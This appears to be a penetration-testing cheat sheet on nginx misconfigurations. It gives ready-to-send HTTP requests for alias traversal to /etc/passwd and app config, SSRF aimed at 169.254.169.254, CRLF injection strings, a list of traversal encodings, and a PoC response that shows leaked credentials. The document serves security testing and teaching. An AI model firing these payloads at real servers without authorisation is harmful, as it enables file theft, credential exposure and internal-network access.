# Nginx Misconfigurations

**What it is:** Common nginx config mistakes → path traversal, source disclosure, SSRF, auth bypass, internal-endpoint exposure. Fingerprint nginx first (`Server: nginx`), then test.

## 1. Off-by-slash / alias traversal (the classic)
Config:
```nginx
location /static {
    alias /var/www/app/static/;
}
```
No trailing slash on `location` but `alias` has one → traversal:
```http
GET /static../etc/passwd HTTP/1.1
Host: target.com
```
Resolves to `/var/www/app/static/../etc/passwd` = `/var/www/app/etc/passwd`; with deeper `../` → arbitrary read.
Also try:
```
GET /static../  → directory listing / source
GET /assets../app.py
```

## 2. Merge_slashes off → path bypass
```
GET //admin HTTP/1.1
GET /app//..//admin
```
If `merge_slashes off`, `//` and encoded slashes reach handlers the proxy meant to block.

## 3. `location` prefix matching flaws
```nginx
location /api { proxy_pass http://backend; }   # matches /api-secret too
```
```http
GET /api-internal/admin HTTP/1.1
```
Prefix match leaks sibling paths never intended.

## 4. Unsafe variable in proxy_pass → SSRF / request splitting
```nginx
location / { proxy_pass http://$host; }         # attacker controls Host
location /p { proxy_pass http://backend/$1; }   # unsanitized URI
```
```http
GET /p/..%2f..%2finternal HTTP/1.1
Host: 169.254.169.254
```
Reflected `$host`/`$uri` into upstream → SSRF, CRLF via `$uri`, cache-key confusion.

## 5. DNS resolver SSRF (`resolver` + dynamic upstream)
Dynamic `proxy_pass` with a `resolver` line → attacker-influenced hostname resolves to internal.

## 6. Exposed internal endpoints
```
/nginx_status           (stub_status — internal metrics)
/.well-known/           misconfig
/server-status          (if apache behind)
```

## 7. Raw config / source disclosure
- `alias` traversal → read `nginx.conf`, `.env`, app source.
- Missing `location ~ /\.` block → `/.git/`, `/.env` served.
- Backup files served as text (no handler): `app.php~`, `index.php.bak`.

## 8. CRLF via nginx rewrite/redirect
```
GET /?x=%0d%0aInjected:header HTTP/1.1
```
Reflected into a `Location`/`add_header` from a variable → response splitting.

## 9. `underscores_in_headers` / header smuggling to backend
Nginx drops underscore headers by default; if `on`, `X_Forwarded_For`-style spoofing reaches app.

## Detection
- [ ] Fingerprint nginx + version (`Server`, error page style).
- [ ] Test alias traversal on every `/static`, `/assets`, `/media`, `/download`, `/files` prefix.
- [ ] Probe `//`, `/./`, `%2f`, `..%2f`, trailing-slash variants on protected paths.
- [ ] `nuclei -t http/misconfiguration -t exposures`, `gixy` (nginx config analyzer) if config leaks.

## Impact
Arbitrary file read (source/secrets), SSRF, auth bypass, response splitting.

## 🎯 PoC — Request → Response (alias off-by-slash traversal)

```http
GET /static../etc/passwd HTTP/2
Host: target.com
```
```http
HTTP/2 200 OK
Content-Type: application/octet-stream

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...                                   ← alias resolved /static/ + ../etc/passwd
```
Read app source the same way:
```http
GET /static../app/config/database.yml HTTP/2
Host: target.com
```
```http
HTTP/2 200 OK

production:
  adapter: postgresql
  password: S3cr3tDbP@ss           ← credentials disclosed
```

## Deep cuts — more nginx/Apache footguns
- [ ] **`X-Accel-Redirect` internal-file read:** if the app sets `X-Accel-Redirect` from user input, or an `internal` location is reachable, request an internal-only path → arbitrary file serve.
- [ ] **`proxy_pass` trailing-slash semantics:** `proxy_pass http://back;` vs `http://back/` changes URI rewriting → path-append SSRF / route confusion; `$request_uri` vs `$uri` (decoded) differ on `%2f`/`..`.
- [ ] **`try_files`/`error_page` bypass:** a fallback `try_files $uri /index.php?$args` can be gamed with `%00`/`;`/PATH_INFO to execute unexpected handlers; `error_page` internal redirect leaking a protected location.
- [ ] **`add_header` inheritance loss:** a `location`/`if` block that sets any `add_header` **drops all inherited security headers** (CSP/HSTS/XFO) for that route → deliver XSS/clickjacking there (`05-client-side/06`).
- [ ] **`if` + `return`/`rewrite` pitfalls & `map` default:** misordered `if` blocks and a permissive `map` default value route/authorize incorrectly.
- [ ] **DNS `resolver` rebind SSRF:** dynamic `proxy_pass $upstream` with a public `resolver` → attacker hostname re-resolves internal (`09-advanced/06`).
- [ ] **Apache equivalents:** `mod_rewrite` `%0a`/`%0d` newline in rewrite, `RequestHeader set` from a variable (CRLF), `AllowOverride All` → `.htaccess` upload changes handlers (`06-file-upload/01`), `mod_proxy` SSRF (`ProxyPassMatch`), `Options +Includes` → SSI, and `AddHandler`/`MultiViews` extension confusion.
- [ ] **Traversal encoding zoo:** `%2e%2e%2f`, `..%252f`, `..%c0%af`, `%2e%2e/`, `.%2e/`, `..%5c` (backslash), plus the alias off-by-slash above — run the full set on every static prefix.
- [ ] **Exposed:** `/nginx_status`, `/basic_status`, `/.well-known` misconfig, `client_body_temp`/`fastcgi_temp` world-readable, and source via missing `location ~ /\.`.

## Report notes
Show the traversal reading a real file (`/etc/passwd` or app source) or the SSRF hit. Cite the misconfig pattern (alias off-by-slash / `add_header` drop / `X-Accel-Redirect` / resolver-rebind).
